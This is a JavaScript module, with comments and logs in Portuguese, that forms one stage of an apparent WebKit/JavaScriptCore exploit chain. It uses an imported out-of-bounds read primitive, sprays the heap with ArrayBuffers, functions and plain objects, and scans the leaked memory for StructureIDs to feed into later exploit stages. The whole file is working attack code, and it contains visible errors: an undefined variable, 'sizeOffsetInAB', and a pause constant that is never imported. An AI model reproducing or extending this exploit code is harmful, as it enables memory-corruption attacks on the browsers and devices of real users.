// js/script3/readStructureIDs.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const MAX_SPRAY_OBJS_FOR_ID_LEAK = 150;
const DEFAULT_AB_SIZE_FOR_ID_LEAK = 128; // Usado para ArrayBuffer na verificação

async function findAndLogStructureIDInternal(objectFactory, objectTypeName, verificationLogicFn, logFn = logS3, currentAttempt = 0) {
    const FNAME = `findAndLogStructureIDInternal<${objectTypeName}>`;
    logFn(` Tentativa #${currentAttempt} para encontrar StructureID de: ${objectTypeName}`, "info", FNAME);

    // O ambiente OOB deve ser configurado pelo chamador (discoverStructureIDs) antes deste loop.
    if (!oob_array_buffer_real) {
        logFn("ERRO: Ambiente OOB não configurado antes de chamar findAndLogInternal. Abortando.", "error", FNAME);
        return null;
    }

    logFn(` Pulverizando ${MAX_SPRAY_OBJS_FOR_ID_LEAK} instâncias de ${objectTypeName}...`, "info", FNAME);
    let sprayedObjects = [];
    for (let i = 0; i < MAX_SPRAY_OBJS_FOR_ID_LEAK; i++) {
        try {
            sprayedObjects.push(objectFactory());
        } catch (e) {
            logFn(`  Erro ao criar objeto de spray ${i} para ${objectTypeName}: ${e.message}`, "warn", FNAME);
        }
    }
    if (sprayedObjects.length === 0) {
        logFn(`Nenhum objeto ${objectTypeName} pulverizado.`, "warn", FNAME);
        return null;
    }
    logFn(`  ${sprayedObjects.length} objetos ${objectTypeName} pulverizados. Pausando...`, "good", FNAME);
    await PAUSE_S3(500); // Pausa para estabilização do heap

    let foundStructureID = null;
    const readUnitForScan = 8; // Ler em blocos de 8 para tentar pegar JSCell headers

    // Varrer uma porção do oob_array_buffer_real
    const searchStart = Math.max(0, (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (DEFAULT_AB_SIZE_FOR_ID_LEAK * 20)); // Ampliar busca para trás
    const searchEnd = Math.min(
        oob_array_buffer_real.byteLength - readUnitForScan,
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) + (DEFAULT_AB_SIZE_FOR_ID_LEAK * 10)
    );

    logFn(` Varrendo de ${toHex(searchStart)} a ${toHex(searchEnd)} dentro de oob_array_buffer_real (tamanho: ${toHex(oob_array_buffer_real.byteLength)})`, "info", FNAME);
    let lastLoggedProgressOffset = searchStart;

    for (let candidateBaseAbsOffset = searchStart; candidateBaseAbsOffset < searchEnd; candidateBaseAbsOffset += 8) { // Alinhamento de 8 bytes
        if (!oob_array_buffer_real) { // Checagem extra de sanidade
            logFn("   ERRO CRÍTICO: oob_array_buffer_real tornou-se nulo durante a varredura!", "error", FNAME);
            break;
        }
        try {
            const potentialID = await verificationLogicFn(candidateBaseAbsOffset, objectTypeName, logFn);
            if (potentialID !== null && potentialID !== undefined) {
                foundStructureID = potentialID;
                // O log de sucesso já está dentro da verificationLogicFn
                break;
            }
        } catch (e_verify) {
            // Logar com menos frequência para não poluir demais
            if (candidateBaseAbsOffset % (1024 * 2) === 0) { // Logar a cada 8KB de varredura
                 logFn(`  Exceção em verificationLogicFn para ${objectTypeName} em ${toHex(candidateBaseAbsOffset)}: ${e_verify.message}`, "warn", FNAME);
            }
        }

        if (candidateBaseAbsOffset > lastLoggedProgressOffset + (1024 * 100)) { // Logar progresso a cada ~100KB
            logFn(`   Varredura de ID para ${objectTypeName} em ${toHex(candidateBaseAbsOffset)}...`, "info", FNAME);
            lastLoggedProgressOffset = candidateBaseAbsOffset;
            await PAUSE_S3(10); // Pequena pausa para permitir que outros processos (e o log) funcionem
        }
    }

    if (foundStructureID === null) {
        logFn(`StructureID para ${objectTypeName} não encontrado nesta tentativa/varredura.`, "warn", FNAME);
    }

    sprayedObjects = null; // Ajudar GC
    return foundStructureID;
}

async function verifyArrayBufferAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const sizeOffsetInABObject = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
    const FNAME_VERIFY = `verifyAB_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(sizeOffsetInABObject + 4, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;

        const potentialSize = oob_read_absolute(baseAbsOffsetInOOB + sizeOffsetInAB, 4, logFn);
        if (potentialSize === DEFAULT_AB_SIZE_FOR_ID_LEAK) {
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) { // Heurística simples
                logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: Tamanho OK (${DEFAULT_AB_SIZE_FOR_ID_LEAK}). StructureID lido: ${toHex(structureID)}`, "leak", FNAME_VERIFY);
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}

async function verifyJSFunctionAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const executableOffset = parseInt(JSC_OFFSETS.JSFunction.M_EXECUTABLE_OFFSET, 16);
    const FNAME_VERIFY = `verifyFunc_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(executableOffset + 8, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;

        const ptr = oob_read_absolute(baseAbsOffsetInOOB + executableOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr) && (ptr.low() !== 0 || ptr.high() !== 0) && ptr.low() !== 0xFFFFFFFF) { // Check non-null/non-garbage
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
             if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) {
                logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: ExecutablePtr OK (${ptr.toString(true)}). StructureID lido: ${toHex(structureID)}`, "leak", FNAME_VERIFY);
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}

async function verifyGenericJSObjectAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const butterflyOffset = parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 16);
    const FNAME_VERIFY = `verifyObj_${typeName}`;
    try {
        if (baseAbsOffsetInOOB + Math.max(butterflyOffset + 8, structureIdOffset + 4) > oob_array_buffer_real.byteLength) return null;

        const ptr = oob_read_absolute(baseAbsOffsetInOOB + butterflyOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr)) { // Butterfly pode ser nulo para objetos vazios, mas ainda é um ponteiro
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            if (structureID !== 0 && structureID !== 0xFFFFFFFF && (structureID & 0xF0000000) === 0) {
                logFn(`  Candidato ${typeName} em ${toHex(baseAbsOffsetInOOB)}: ButterflyPtr ${ptr.toString(true)}. StructureID lido: ${toHex(structureID)}`, "leak", FNAME_VERIFY);
                return structureID;
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}

export async function discoverStructureIDs() {
    const FNAME_MAIN = "discoverStructureIDs";
    logS3(`==== INICIANDO Descoberta de StructureIDs (S3) v1.3 ====`, "test", FNAME_MAIN);
    const results = {
        ArrayBuffer: null,
        JSFunction: null,
        JSObjectGeneric: null,
    };
    const MAX_GLOBAL_ATTEMPTS = 2; // Número de tentativas globais de spray e varredura

    for (let attempt = 1; attempt <= MAX_GLOBAL_ATTEMPTS; attempt++) {
        logS3(`--- Tentativa Global de Descoberta de IDs #${attempt}/${MAX_GLOBAL_ATTEMPTS} ---`, "info", FNAME_MAIN);

        // Tentar ArrayBuffer
        if (!results.ArrayBuffer) {
            await triggerOOB_primitive(logS3);
            if (oob_array_buffer_real) {
                results.ArrayBuffer = await findAndLogStructureIDInternal(() => new ArrayBuffer(DEFAULT_AB_SIZE_FOR_ID_LEAK), "ArrayBuffer", verifyArrayBufferAndReturnID, logS3, attempt);
                clearOOBEnvironment(); // Limpar para o próximo tipo
            } else { logS3("Falha OOB, pulando ArrayBuffer nesta tentativa.", "error", FNAME_MAIN); }
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        // Tentar JSFunction
        if (!results.JSFunction) {
            await triggerOOB_primitive(logS3);
            if (oob_array_buffer_real) {
                results.JSFunction = await findAndLogStructureIDInternal(() => function() { let a=1; return a+1; }, "JSFunction", verifyJSFunctionAndReturnID, logS3, attempt);
                clearOOBEnvironment();
            } else { logS3("Falha OOB, pulando JSFunction nesta tentativa.", "error", FNAME_MAIN); }
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        // Tentar JSObjectGeneric
        if (!results.JSObjectGeneric) {
            await triggerOOB_primitive(logS3);
            if (oob_array_buffer_real) {
                 results.JSObjectGeneric = await findAndLogStructureIDInternal(() => ({p1:123, p2:"abc"}), "JSObjectGeneric", verifyGenericJSObjectAndReturnID, logS3, attempt);
                clearOOBEnvironment();
            } else { logS3("Falha OOB, pulando JSObjectGeneric nesta tentativa.", "error", FNAME_MAIN); }
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        if (Object.values(results).every(val => val !== null && val !== undefined)) {
            logS3("Todos os StructureIDs alvo foram encontrados ou todas as tentativas foram feitas para eles.", "good", FNAME_MAIN);
            break;
        }
        if (attempt < MAX_GLOBAL_ATTEMPTS) {
            logS3("Pausa longa antes da próxima tentativa global de descoberta de IDs...", "info", FNAME_MAIN);
            await PAUSE_S3(LONG_PAUSE_S3 * 2);
        }
    }

    logS3("--- Resultados Finais da Descoberta de StructureIDs ---", "test", FNAME_MAIN);
    for (const typeName in results) {
        if (results[typeName] !== null && results[typeName] !== undefined) {
            logS3(`  ${typeName}: ${toHex(results[typeName])}`, "good", FNAME_MAIN);
        } else {
            logS3(`  ${typeName}: Não encontrado ou inválido`, "warn", FNAME_MAIN);
        }
    }
    logS3("PREENCHA OS VALORES ENCONTRADOS EM KNOWN_STRUCTURE_IDS NO SEU config.mjs!", "critical", FNAME_MAIN);
    logS3(`==== Descoberta de StructureIDs CONCLUÍDA ====`, "test", FNAME_MAIN);
}
